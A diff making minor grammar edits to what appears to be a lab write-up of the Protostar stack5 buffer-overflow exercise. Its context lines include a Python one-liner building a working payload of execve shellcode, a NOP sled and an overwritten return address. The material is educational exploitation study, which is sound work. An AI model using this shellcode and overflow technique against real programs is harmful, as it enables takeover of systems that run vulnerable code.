@@ -521,8 +521,8 @@ Don't forget, little endian, thus the address of the buffer in stack turns into
 \xb0\xf7\xff\xbf.
 
 ```0x90``` is the NOP instruction, or No Operation. It is equivalent to
-```xchg eax, eax```. It does nothing, but uses up a cycle. It is thus ideal to
-build a "sled" to fill up the buffer.
+```xchg eax, eax```. It does nothing, but uses up a cycle. It is thus ideal for
+building a "sled" to fill up the buffer.
 
 So with the shellcode mentioned before, at 21 bytes, and the format of our
 payload, our final payload should be as follows:
@@ -531,7 +531,7 @@ payload, our final payload should be as follows:
 python -c "print '\x6a\x0b\x58\x99\x31\xc9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\x90' * (76-21)  + '\xb0\xf7\xff\xbf'" > /tmp/stack5.pwn
 ```
 
-Now we have one issue, is python is injecting a byte at the end; 0x0a
+Now we have one issue, python is injecting a byte at the end; 0x0a
 
 ```sh
 root@protostar:/opt/protostar/bin# xxd /tmp/stack5.pwn
